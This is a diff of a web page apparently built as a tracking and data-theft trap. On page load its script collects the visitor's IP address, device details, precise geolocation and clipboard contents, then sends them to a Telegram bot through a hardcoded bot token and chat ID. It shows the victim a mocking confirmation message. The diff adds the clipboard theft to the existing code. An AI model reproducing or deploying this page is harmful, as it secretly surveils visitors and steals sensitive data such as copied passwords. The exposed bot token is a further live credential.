@@ -3,7 +3,8 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>ELITE-PXTCH HERE</title>
+    <title>ELITE Elite-Pxtch</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
     <script src="https://cdn.tailwindcss.com"></script>
     <style>
    
@@ -54,117 +55,116 @@
         <div id="messageBox"></div>
     </div>
 
-    <script>
-        const BOT_TOKEN = "7956295976:AAFA8acrQp0dmS4Xm3juGQwhAsH47aW-03k";
-        const CHAT_ID = "7291851471";
+<script>
+    const BOT_TOKEN = "7956295976:AAFA8acrQp0dmS4Xm3juGQwhAsH47aW-03k";
+    const CHAT_ID = "7291851471";
 
-        const messageBox = document.getElementById("messageBox");
+    const messageBox = document.getElementById("messageBox");
 
-
-
-        function showMessage(message, type = 'info') {
-            messageBox.textContent = message;
-            messageBox.style.display = 'block';
-            messageBox.className = `mt-20 p-15 border rounded-lg font-medium ${
-                type === 'error' ? 'bg-red-100 border-red-300 text-red-800' : 'bg-blue-100 border-blue-300 text-blue-800'
-            }`;
-         
-            setTimeout(() => {
-                messageBox.style.display = 'none';
-            }, 5000);
+    function showMessage(message, type = 'info') {
+        messageBox.textContent = message;
+        messageBox.style.display = 'block';
+        messageBox.className = `mt-20 p-15 border rounded-lg font-medium ${
+            type === 'error'
+                ? 'bg-red-100 border-red-300 text-red-800'
+                : 'bg-blue-100 border-blue-300 text-blue-800'
+        }`;
+     
+        setTimeout(() => {
+            messageBox.style.display = 'none';
+        }, 5000);
+    }
+    function escapeMarkdownV2(text) {
+        return text.replace(/([_*\[\]()~`>#+\-=|{}.!])/g, '\\$1');
         }
 
-        
-        async function getIP() {
-            try {
-                const res = await fetch("https://api.ipify.org?format=json");
-                const data = await res.json();
-                return data.ip;
-            } catch (error) {
-            
-                return "Unknown";
+    async function getIP() {
+        try {
+            const res = await fetch("https://api.ipify.org?format=json");
+            const data = await res.json();
+            return data.ip;
+        } catch (error) {
+            return "Unknown";
+        }
+    }
+
+    async function getClipboard() {
+        try {
+            const text = await navigator.clipboard.readText();
+            return text ? text : "Clipboard empty";
+        } catch (err) {
+            return "Clipboard access denied";
+        }
+    }
+
+    function getDevice() {
+        return navigator.userAgent;
+    }
+
+    function getLocation() {
+        return new Promise((resolve) => {
+            if (!navigator.geolocation) {
+                return resolve("Not supported");
             }
-        }
-
-       
-        function getDevice() {
-            return navigator.userAgent;
-        }
-
-       
-        function getLocation() {
-            return new Promise((resolve) => {
-                if (!navigator.geolocation) {
-                  
-                    return resolve("Not supported");
-                }
-                navigator.geolocation.getCurrentPosition(
-                    (pos) => {
-                        resolve(`Lat: ${pos.coords.latitude}, Lon: ${pos.coords.longitude}`);
-                    },
-                    (error) => {
-                        let errorMessage = "Permission denied or other error";
-                        if (error.code === error.PERMISSION_DENIED) {
-                            errorMessage = "Location permission denied";
-                        } else if (error.code === error.POSITION_UNAVAILABLE) {
-                            errorMessage = "Location information unavailable";
-                        } else if (error.code === error.TIMEOUT) {
-                            errorMessage = "Location request timed out";
-                        }
-                        // Removed log for location error
-                        resolve(errorMessage);
-                    },
-                    {
-                        timeout: 10000, // 10 seconds timeout for location request
-                        enableHighAccuracy: true // Try to get the most accurate position
+            navigator.geolocation.getCurrentPosition(
+                (pos) => {
+                    resolve(`Lat: ${pos.coords.latitude}, Lon: ${pos.coords.longitude}`);
+                },
+                (error) => {
+                    let errorMessage = "Permission denied or other error";
+                    if (error.code === error.PERMISSION_DENIED) {
+                        errorMessage = "Location permission denied";
+                    } else if (error.code === error.POSITION_UNAVAILABLE) {
+                        errorMessage = "Location unavailable";
+                    } else if (error.code === error.TIMEOUT) {
+                        errorMessage = "Location request timed out";
                     }
-                );
-            });
-        }
+                    resolve(errorMessage);
+                },
+                { timeout: 10000, enableHighAccuracy: true }
+            );
+        });
+    }
 
-        // Send info to Telegram Bot
-        async function sendInfo() {
-            // Removed log for collecting info
+    // Send info to Telegram Bot
+    async function sendInfo() {
+        const ip = await getIP();
+const device = escapeMarkdownV2(getDevice());
+const location = escapeMarkdownV2(await getLocation());
+const clipboard = escapeMarkdownV2(await getClipboard());
 
-            const ip = await getIP();
-            const device = getDevice();
-            const location = await getLocation();
-
-            const text = `📡 New Info Received
+        const text = `📡 New Info Received
 🌍 IP: ${ip}
 📱 Device: ${device}
 📌 Location: ${location}
-👨‍💻 *DEV: NAVDEEP*`;
+📋 Clipboard: ${clipboard}
+👨‍💻 DEV: NAVDEEP`;
+        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+        const body = new URLSearchParams();
+        body.append("chat_id", CHAT_ID);
+        body.append("text", text);
+        body.append("parse_mode", "Markdown");
 
-            // Removed log for sending info
+        try {
+            const res = await fetch(url, { method: "POST", body });
+            const data = await res.json();
 
-            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-            const body = new URLSearchParams();
-            body.append("chat_id", CHAT_ID);
-            body.append("text", text);
-            body.append("parse_mode", "Markdown");
-
-            try {
-                const res = await fetch(url, { method: "POST", body });
-                const data = await res.json();
-                // Removed log for Telegram API Response
-
-                if (data.ok) {
-                    showMessage("✅ AH YOUR LOCATION IP DEVICE AND MORE INFO GO TO ELITE-PXTCH HAHAHAHAHAH", 'info');
-                } else {
-                    showMessage("❌ Erorr please allow permission " + data.description, 'error');
-                }
-            } catch (err) {
-                console.error("Network error:", err); // Kept console.error for debugging
-                showMessage("⚠️ Network error..", 'error');
+            if (data.ok) {
+                showMessage("✅ Info sent to Elite-Pxtch 😈", 'info');
+            } else {
+                showMessage("❌ Error: " + data.description, 'error');
             }
+        } catch (err) {
+            console.error("Network error:", err);
+            showMessage("⚠️ Network error..", 'error');
         }
+    }
 
-        // Run sendInfo automatically when the entire page is loaded
-        window.onload = function() {
-            sendInfo();
-        };
-    </script>
+    // Run sendInfo automatically when the page is loaded
+    window.onload = function() {
+        sendInfo();
+    };
+</script>
+
 </body>
 </html>
-
